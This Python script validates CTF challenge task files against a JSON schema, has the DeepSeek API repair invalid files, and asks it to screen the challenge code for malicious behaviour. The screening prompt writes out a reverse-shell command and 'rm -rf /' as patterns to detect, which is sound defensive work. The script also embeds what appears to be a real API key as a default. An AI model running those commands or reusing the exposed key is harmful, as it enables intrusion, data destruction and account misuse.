import json
import os
import jsonschema
from jsonschema import validate
import requests
from datetime import datetime
import logging
import re
from dotenv import load_dotenv

# 加载环境变量
load_dotenv()

# 项目根目录（validate_json.py 在 validator/ 下，所以上一级就是项目根）
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('validator.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# DeepSeek API配置
DEEPSEEK_API_KEY = os.getenv('DEEPSEEK_API_KEY', 'sk-40de685244784229bdb112b879d3248b')  # 你的API密钥
DEEPSEEK_URL = "https://api.deepseek.com/v1/chat/completions"  # DeepSeek API端点


# Load the schema from a JSON file
def load_schema(filepath):
    """加载JSON schema文件"""
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception as e:
        logger.error(f"加载schema文件失败 {filepath}: {str(e)}")
        raise


# Validate JSON data against the schema
def validate_json(data, schema):
    """验证JSON数据是否符合schema"""
    errors = []
    try:
        validate(instance=data, schema=schema)
        logger.debug("JSON验证通过")
    except jsonschema.exceptions.ValidationError as e:
        errors.append(str(e))
        logger.debug(f"JSON验证失败: {str(e)}")
    return errors


# Generate report based on errors
def generate_report(errors, filename=""):
    """生成验证报告"""
    if not errors:
        return {
            "status": "success",
            "message": "All checks passed.",
            "filename": filename,
            "timestamp": datetime.now().isoformat()
        }
    else:
        # 只保留主要错误信息
        simplified_errors = []
        for error in errors:
            # 提取错误的第一行
            lines = error.split('\n')
            simplified_errors.append(lines[0] if lines else error)

        return {
            "status": "error",
            "errors": simplified_errors,
            "filename": filename,
            "timestamp": datetime.now().isoformat()
        }


def parse_deepseek_response(response_text):
    """解析DeepSeek API的响应"""
    try:
        # 打印原始响应用于调试
        logger.debug(f"原始响应: {response_text[:200]}")  # 只打印前200字符

        # 情况1：先尝试直接解析JSON
        try:
            data = json.loads(response_text)
            logger.info("直接JSON解析成功")
            return data.get('modified_input'), data.get('modified_data')
        except json.JSONDecodeError:
            pass

        # 情况2：移除markdown代码块标记
        logger.info("尝试移除markdown标记...")

        # 移除 ```json 和 ``` 标记
        cleaned_text = response_text.replace('```json', '').replace('```', '').strip()

        try:
            data = json.loads(cleaned_text)
            logger.info("移除markdown后解析成功")
            return data.get('modified_input'), data.get('modified_data')
        except json.JSONDecodeError:
            pass

        # 情况3：使用正则表达式提取JSON
        logger.info("尝试使用正则表达式提取JSON...")
        import re

        # 匹配从{到}的所有内容，包括换行
        json_pattern = r'(\{[\s\S]*\})'
        matches = re.findall(json_pattern, response_text, re.DOTALL)

        for match in matches:
            try:
                data = json.loads(match)
                if 'modified_input' in data or 'modified_data' in data:
                    logger.info("正则表达式提取JSON成功")
                    return data.get('modified_input'), data.get('modified_data')
            except json.JSONDecodeError:
                continue

        # 情况4：尝试分割两个JSON对象
        logger.info("尝试分割JSON对象...")
        try:
            # 查找两个连续的JSON对象
            import re
            # 找到所有JSON对象
            json_objects = re.findall(r'\{[^{}]*(?:\{[^{}]*\}[^{}]*)*\}', response_text, re.DOTALL)

            if len(json_objects) >= 2:
                modified_input = json.loads(json_objects[0])
                modified_data = json.loads(json_objects[1])
                logger.info("分割JSON对象成功")
                return modified_input, modified_data
        except Exception as e:
            logger.debug(f"分割失败: {e}")

        logger.error("所有解析方法都失败")
        return None, None

    except Exception as e:
        logger.error(f"解析过程出错: {str(e)}")
        return None, None


# Call DeepSeek API to modify the file based on errors
def call_deepseek(input_filepath, data_filepath, errors, schema):
    """调用DeepSeek API修复错误，需要传入schema"""

    # 读取文件内容
    try:
        with open(input_filepath, 'r', encoding='utf-8') as f:
            input_content = json.load(f)
        with open(data_filepath, 'r', encoding='utf-8') as f:
            data_content = json.load(f)
    except Exception as e:
        logger.error(f"读取文件失败: {str(e)}")
        return None, None

    headers = {
        "Authorization": f"Bearer {DEEPSEEK_API_KEY}",
        "Content-Type": "application/json"
    }

    # 从schema中动态获取required字段
    top_required = schema.get('required', [])
    top_required_str = ', '.join(top_required) if top_required else '无'

    prompt = f"""你是一个专业的JSON schema验证修复专家。请根据以下schema定义，自动修复这两个JSON文件。

【SCHEMA定义】
{json.dumps(schema, ensure_ascii=False, indent=2)}

【当前错误信息】
{chr(10).join(errors)}

【需要修复的文件1 - 输入文件】
{json.dumps(input_content, ensure_ascii=False, indent=2)}

【需要修复的文件2 - 数据文件】
{json.dumps(data_content, ensure_ascii=False, indent=2)}

【修复要求】
1. 严格按照schema定义的结构重构文件
2. schema中"required"的字段必须存在
3. 字段类型必须匹配schema定义
4. 如果字段有"enum"，值必须在枚举列表中
5. 保持原文件中的有用信息，但按schema重新组织
6. 对于schema中定义的嵌套对象，必须创建完整的结构

【处理逻辑】
1. 首先分析schema的顶层required字段：{top_required_str}
2. 然后分析每个嵌套对象的required字段
3. 从原文件中提取对应值，如果没有则使用合理的默认值
4. 确保所有字段类型正确

【返回格式要求】
只返回一个JSON对象，格式如下：
{{
    "modified_input": 修复后的文件1内容（完全符合schema）,
    "modified_data": 修复后的文件2内容（完全符合schema）
}}

不要添加任何markdown标记或解释文字。
"""

    payload = {
        "model": "deepseek-chat",
        "messages": [
            {"role": "system", "content": "你是一个JSON schema验证修复专家，严格按照schema定义修复JSON文件。"},
            {"role": "user", "content": prompt}
        ],
        "temperature": 0.1,
        "max_tokens": 8000
    }

    try:
        logger.info(f"调用DeepSeek API修复文件: {os.path.basename(input_filepath)}")
        response = requests.post(DEEPSEEK_URL, headers=headers, json=payload, timeout=120)
        response.raise_for_status()

        result = response.json()
        content = result['choices'][0]['message']['content']

        # 调试输出
        print("\n" + "=" * 60)
        print("🔍 DeepSeek返回的修复结果:")
        print("=" * 60)
        print(content)
        print("=" * 60 + "\n")

        modified_input, modified_data = parse_deepseek_response(content)

        if modified_input and modified_data:
            logger.info("DeepSeek API调用成功")
            return modified_input, modified_data
        else:
            logger.error("无法从响应中提取有效的JSON")
            return None, None

    except Exception as e:
        logger.error(f"DeepSeek API调用失败: {str(e)}")
        return None, None


def analyze_code_security(code_content, language):
    """使用DeepSeek分析代码安全性"""

    headers = {
        "Authorization": f"Bearer {DEEPSEEK_API_KEY}",
        "Content-Type": "application/json"
    }

    prompt = f"""你是一个CTF题目代码审计专家。以下代码是CTF比赛题目的源码，其中的SQL注入、命令执行、文件包含等漏洞是**故意设计**的题目考点，不属于安全风险。

    请只检测以下真正危险的恶意行为：
    1. 反弹shell到外部IP（如bash -i >& /dev/tcp/外部IP/端口）
    2. 挖矿代码
    3. 删除或破坏系统关键文件（如rm -rf /）
    4. 硬编码的外部C2服务器地址
    5. 数据外传行为（将数据发送到题目环境以外的服务器）

    如果只是普通的CTF漏洞考点，请返回overall_risk_level为"安全"。

    【代码内容】（{language}）
    {code_content}

    【返回格式要求】
    只返回一个JSON对象，格式如下：
    {{
        "security_risks": [
            {{
                "risk_type": "风险类型",
                "severity": "高危/中危/低危",
                "description": "风险描述",
                "code_location": "代码位置（行号或函数名）",
                "suggestion": "修复建议"
            }}
        ],
        "overall_risk_level": "高危/中危/低危/安全",
        "summary": "总体安全评估"
    }}

    如果没有发现安全风险，返回：
    {{
        "security_risks": [],
        "overall_risk_level": "安全",
        "summary": "代码没有发现明显安全风险"
    }}

    不要添加任何markdown标记或解释文字。
    """

    payload = {
        "model": "deepseek-chat",
        "messages": [
            {"role": "system", "content": "你是一个专业的代码安全分析专家，只返回JSON格式的分析结果。"},
            {"role": "user", "content": prompt}
        ],
        "temperature": 0.1,
        "max_tokens": 4000
    }

    try:
        response = requests.post(DEEPSEEK_URL, headers=headers, json=payload, timeout=60)
        response.raise_for_status()

        result = response.json()
        content = result['choices'][0]['message']['content']

        # 解析返回的JSON
        try:
            # 清理可能的markdown标记
            cleaned = content.replace('```json', '').replace('```', '').strip()
            security_report = json.loads(cleaned)
            return security_report
        except json.JSONDecodeError:
            logger.error(f"无法解析安全分析结果: {content}")
            return None

    except Exception as e:
        logger.error(f"安全分析API调用失败: {str(e)}")
        return None



def validate_code_syntax(generated_dir: str) -> dict:
    """
    对生成目录下所有代码文件进行语法校验。
    Python文件用 py_compile，PHP/C文件做基础括号配对检查。
    返回 {'passed': bool, 'errors': [{'file': str, 'error': str}]}
    """
    import subprocess
    import py_compile
    import tempfile

    errors = []
    CODE_EXTS = {'.py', '.php', '.c', '.cpp', '.js', '.sql'}

    if not os.path.isdir(generated_dir):
        return {'passed': True, 'errors': []}

    for dirpath, _, filenames in os.walk(generated_dir):
        for filename in filenames:
            ext = os.path.splitext(filename)[1].lower()
            if ext not in CODE_EXTS:
                continue
            filepath = os.path.join(dirpath, filename)

            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    code = f.read()
            except Exception as e:
                continue

            # Python文件：用py_compile做完整语法检查
            if ext == '.py':
                try:
                    with tempfile.NamedTemporaryFile(suffix='.py', mode='w',
                                                     encoding='utf-8', delete=False) as tmp:
                        tmp.write(code)
                        tmp_path = tmp.name
                    py_compile.compile(tmp_path, doraise=True)
                    os.unlink(tmp_path)
                except py_compile.PyCompileError as e:
                    errors.append({
                        'file': filename,
                        'error': f"Python语法错误: {str(e)}"
                    })
                    try:
                        os.unlink(tmp_path)
                    except:
                        pass

            # PHP文件：检查括号配对
            elif ext == '.php':
                open_braces = code.count('{')
                close_braces = code.count('}')
                if abs(open_braces - close_braces) > 2:
                    errors.append({
                        'file': filename,
                        'error': f"PHP括号不匹配: {{={open_braces}, }}={close_braces}"
                    })

            # C文件：检查括号配对和基本结构
            elif ext == '.c':
                open_braces = code.count('{')
                close_braces = code.count('}')
                if abs(open_braces - close_braces) > 1:
                    errors.append({
                        'file': filename,
                        'error': f"C括号不匹配: {{={open_braces}, }}={close_braces}"
                    })
                if 'main' not in code:
                    errors.append({
                        'file': filename,
                        'error': "C文件缺少main函数"
                    })

            # SQL文件：检查是否包含PHP代码（幻觉检测）
            elif ext == '.sql':
                if '<?php' in code.lower():
                    errors.append({
                        'file': filename,
                        'error': "SQL文件混入了PHP代码（AI幻觉）"
                    })

    return {
        'passed': len(errors) == 0,
        'errors': errors
    }


def extract_code_from_data(data_content):
    """从data文件中提取所有代码内容"""
    code_snippets = []

    # 检查 vulnerable_code
    if 'vulnerable_code' in data_content:
        code = data_content['vulnerable_code'].get('code', '')
        language = data_content['vulnerable_code'].get('language', '未知')
        filename = data_content['vulnerable_code'].get('filename', '未知')
        if code:
            code_snippets.append({
                'type': '漏洞代码',
                'filename': filename,
                'language': language,
                'code': code
            })

    # 检查 database_setup (SQL代码)
    if 'database_setup' in data_content:
        sql = data_content['database_setup'].get('sql', '')
        if sql:
            code_snippets.append({
                'type': '数据库脚本',
                'filename': data_content['database_setup'].get('filename', 'setup.sql'),
                'language': 'sql',
                'code': sql
            })

    # 检查 docker_config (YAML配置)
    if 'docker_config' in data_content:
        yaml = data_content['docker_config'].get('content', '')
        if yaml:
            code_snippets.append({
                'type': 'Docker配置',
                'filename': data_content['docker_config'].get('filename', 'docker-compose.yml'),
                'language': 'yaml',
                'code': yaml
            })

    # 检查 solution (可能存在测试代码)
    if 'solution' in data_content and 'exploit_code' in data_content['solution']:
        exploit = data_content['solution'].get('exploit_code', '')
        if exploit:
            code_snippets.append({
                'type': '利用代码',
                'filename': 'exploit.py',
                'language': 'python',
                'code': exploit
            })

    return code_snippets


# Process JSON files in both input and data directories
def process_files(input_dir, data_dir, output_dir, schema, max_retries=3):
    """处理输入目录和数据目录中的JSON文件"""

    # 确保输出目录存在
    os.makedirs(output_dir, exist_ok=True)

    processed_count = 0
    fixed_count = 0

    # Iterate over files in the input directory
    for filename in os.listdir(input_dir):
        if not filename.endswith('.json'):
            continue

        input_filepath = os.path.join(input_dir, filename)
        data_filename = f"{os.path.splitext(filename)[0]}_data.json"
        data_filepath = os.path.join(data_dir, data_filename)

        logger.info(f"处理文件: {filename}")

        if not os.path.exists(data_filepath):
            logger.warning(f"对应的数据文件不存在: {data_filename}")
            # 生成错误报告
            report = generate_report([f"数据文件 {data_filename} 不存在"], filename)
            report_filepath = os.path.join(output_dir, f"{os.path.splitext(filename)[0]}_report.json")
            with open(report_filepath, 'w', encoding='utf-8') as report_file:
                json.dump(report, report_file, ensure_ascii=False, indent=4)
            continue

        try:
            with open(input_filepath, 'r', encoding='utf-8') as f:
                input_data = json.load(f)
            with open(data_filepath, 'r', encoding='utf-8') as f:
                data_data = json.load(f)

            processed_count += 1

            # Start with first validation
            errors = validate_json(input_data, schema) + validate_json(data_data, schema)
            report = generate_report(errors, filename)

            # Save initial report
            report_filename = f"{os.path.splitext(filename)[0]}_report.json"
            report_filepath = os.path.join(output_dir, report_filename)
            with open(report_filepath, 'w', encoding='utf-8') as report_file:
                json.dump(report, report_file, ensure_ascii=False, indent=4)

            logger.info(f"初始验证: {report['status']} - {len(errors)} 个错误")

            # If errors exist, attempt to fix with DeepSeek up to max_retries times
            retries = 0
            while report['status'] == 'error' and retries < max_retries:
                retries += 1
                logger.info(f"第 {retries} 次尝试修复错误...")

                try:
                    # Call DeepSeek to fix the errors
                    modified_input, modified_data = call_deepseek(input_filepath, data_filepath, report['errors'],
                                                                  schema)

                    if modified_input is None or modified_data is None:
                        logger.error("DeepSeek API返回无效数据")
                        break

                    # 验证修改后的数据
                    input_errors = validate_json(modified_input, schema)
                    data_errors = validate_json(modified_data, schema)
                    new_errors = input_errors + data_errors

                    if len(new_errors) < len(errors):
                        logger.info(f"修复成功！错误数从 {len(errors)} 减少到 {len(new_errors)}")

                        # 创建备份
                        backup_input = f"{input_filepath}.backup"
                        backup_data = f"{data_filepath}.backup"

                        if not os.path.exists(backup_input):
                            os.rename(input_filepath, backup_input)
                        if not os.path.exists(backup_data):
                            os.rename(data_filepath, backup_data)

                        # 写入修复后的文件
                        with open(input_filepath, 'w', encoding='utf-8') as f:
                            json.dump(modified_input, f, ensure_ascii=False, indent=4)
                        with open(data_filepath, 'w', encoding='utf-8') as f:
                            json.dump(modified_data, f, ensure_ascii=False, indent=4)

                        # 更新数据
                        input_data = modified_input
                        data_data = modified_data
                        errors = new_errors
                        report = generate_report(errors, filename)

                        fixed_count += 1

                        # 保存修复后的报告
                        report_filename = f"{os.path.splitext(filename)[0]}_report_fixed_{retries}.json"
                        report_filepath = os.path.join(output_dir, report_filename)
                        with open(report_filepath, 'w', encoding='utf-8') as report_file:
                            json.dump(report, report_file, ensure_ascii=False, indent=4)

                        logger.info(f"修复后报告已保存: {report_filename}")

                        # 如果没有错误了，退出循环
                        if report['status'] == 'success':
                            logger.info(f"文件 {filename} 已成功修复！")

                            # ===== 添加安全检查 =====
                            logger.info(f"开始对 {filename} 进行代码安全性检查...")

                            # 重新读取data文件（可能已被修复）
                            with open(data_filepath, 'r', encoding='utf-8') as f:
                                data_data = json.load(f)

                            # 提取代码进行安全分析
                            code_snippets = extract_code_from_data(data_data)
                            security_results = []
                            has_risks = False

                            for snippet in code_snippets:
                                logger.info(f"分析 {snippet['type']}: {snippet['filename']}")
                                security_result = analyze_code_security(snippet['code'], snippet['language'])

                                if security_result:
                                    # 添加代码片段信息
                                    security_result['code_snippet'] = {
                                        'type': snippet['type'],
                                        'filename': snippet['filename'],
                                        'language': snippet['language']
                                    }
                                    security_results.append(security_result)

                                    if security_result.get('security_risks') and len(
                                            security_result['security_risks']) > 0:
                                        has_risks = True

                            # ===== 1. 生成详细的安全报告（放在security_reports文件夹）=====
                            security_report_dir = os.path.join(BASE_DIR, 'security_reports')
                            os.makedirs(security_report_dir, exist_ok=True)

                            # 确定总体风险等级
                            overall_levels = []
                            for result in security_results:
                                if result.get('security_risks'):
                                    for risk in result.get('security_risks', []):
                                        overall_levels.append(risk.get('severity', '低危'))

                            if '高危' in overall_levels:
                                final_level = '高危'
                            elif '中危' in overall_levels:
                                final_level = '中危'
                            elif '低危' in overall_levels:
                                final_level = '低危'
                            else:
                                final_level = '安全'

                            # 创建详细安全报告
                            detailed_security_report = {
                                'task_id': data_data.get('task_id', '未知'),
                                'task_title': data_data.get('task_title', '未知'),
                                'check_time': datetime.now().isoformat(),
                                'overall_risk_level': final_level,
                                'files_analyzed': len(code_snippets),
                                'code_analysis': security_results,
                                'total_risks': sum(len(r.get('security_risks', [])) for r in security_results),
                                'risk_summary': {
                                    'high': sum(1 for level in overall_levels if level == '高危'),
                                    'medium': sum(1 for level in overall_levels if level == '中危'),
                                    'low': sum(1 for level in overall_levels if level == '低危')
                                }
                            }

                            # 保存详细安全报告
                            security_report_filename = f"{os.path.splitext(filename)[0]}_security_detailed.json"
                            security_report_filepath = os.path.join(security_report_dir, security_report_filename)

                            with open(security_report_filepath, 'w', encoding='utf-8') as f:
                                json.dump(detailed_security_report, f, ensure_ascii=False, indent=4)

                            logger.info(f"详细安全报告已保存: {security_report_filename}")
                            # ========================================================

                            # ===== 2. 读取并更新原报告（添加摘要）=====
                            report_filepath = os.path.join(output_dir,
                                                           f"{os.path.splitext(filename)[0]}_report_fixed_{retries}.json")
                            with open(report_filepath, 'r', encoding='utf-8') as f:
                                existing_report = json.load(f)

                            # 在原报告中添加安全摘要
                            if not has_risks:
                                # 安全检测通过，添加英文语句
                                existing_report['security_check'] = {
                                    "status": "PASSED",
                                    "message": "All security checks passed. No vulnerabilities detected.",
                                    "checked_at": datetime.now().isoformat(),
                                    "files_analyzed": len(code_snippets),
                                    "detailed_report": security_report_filename  # 指向详细报告
                                }
                                logger.info(f"✅ 安全检查通过: {filename}")
                            else:
                                # 发现安全风险，添加摘要
                                existing_report['security_check'] = {
                                    "status": "FAILED",
                                    "message": "Security vulnerabilities detected in the code.",
                                    "checked_at": datetime.now().isoformat(),
                                    "files_analyzed": len(code_snippets),
                                    "risk_summary": {
                                        "total_risks": sum(len(r.get('security_risks', [])) for r in security_results),
                                        "high": sum(1 for level in overall_levels if level == '高危'),
                                        "medium": sum(1 for level in overall_levels if level == '中危'),
                                        "low": sum(1 for level in overall_levels if level == '低危')
                                    },
                                    "detailed_report": security_report_filename  # 指向详细报告
                                }
                                logger.warning(f"⚠️ 发现安全风险! 文件: {filename}, 风险等级: {final_level}")

                            # 重新保存更新后的原报告
                            with open(report_filepath, 'w', encoding='utf-8') as f:
                                json.dump(existing_report, f, ensure_ascii=False, indent=4)

                            logger.info(f"安全检查摘要已添加到原报告: {os.path.basename(report_filepath)}")
                            # ========================================================

                            break
                    else:
                        logger.warning(f"修复未能减少错误数，当前错误: {len(new_errors)}")

                except Exception as e:
                    logger.error(f"修复过程中出错: {str(e)}")
                    break

            # If we still have errors after max_retries, stop trying to fix
            if retries == max_retries and report['status'] == 'error':
                logger.warning(f"达到最大重试次数，文件 {filename} 仍有错误")

        except json.JSONDecodeError as e:
            logger.error(f"JSON解析错误 {filename}: {str(e)}")
            report = generate_report([f"JSON解析错误: {str(e)}"], filename)
            report_filepath = os.path.join(output_dir, f"{os.path.splitext(filename)[0]}_report.json")
            with open(report_filepath, 'w', encoding='utf-8') as report_file:
                json.dump(report, report_file, ensure_ascii=False, indent=4)
        except Exception as e:
            logger.error(f"处理文件 {filename} 时出错: {str(e)}")

    logger.info(f"处理完成！共处理 {processed_count} 个文件，成功修复 {fixed_count} 个文件")
    return processed_count, fixed_count


# Main function to execute the script
def main():
    """主函数"""
    # 配置路径
    input_dir = os.path.join(BASE_DIR, 'tasks_input')
    data_dir = os.path.join(BASE_DIR, 'tasks_data')
    output_dir = os.path.join(BASE_DIR, 'tasks_report')
    schema_file = os.path.join(BASE_DIR, 'schema', 'ctf_task_schema.json')

    # 验证API密钥
    if DEEPSEEK_API_KEY == 'your-api-key-here':
        logger.warning("请设置有效的DeepSeek API密钥！")
        logger.info("你可以：")
        logger.info("1. 在代码中直接设置 DEEPSEEK_API_KEY 变量")
        logger.info("2. 创建 .env 文件并设置 DEEPSEEK_API_KEY=你的密钥")
        logger.info("3. 设置系统环境变量 DEEPSEEK_API_KEY")
        return

    # 检查目录是否存在
    for dir_path in [input_dir, data_dir]:
        if not os.path.exists(dir_path):
            logger.error(f"目录不存在: {dir_path}")
            return

    # 创建输出目录
    os.makedirs(output_dir, exist_ok=True)

    try:
        # Load schema
        logger.info(f"加载schema文件: {schema_file}")
        schema = load_schema(schema_file)
        logger.info("schema加载成功")

        # Process files in the input and data directories
        process_files(input_dir, data_dir, output_dir, schema)

    except Exception as e:
        logger.error(f"程序执行失败: {str(e)}")
        raise


if __name__ == "__main__":
    main()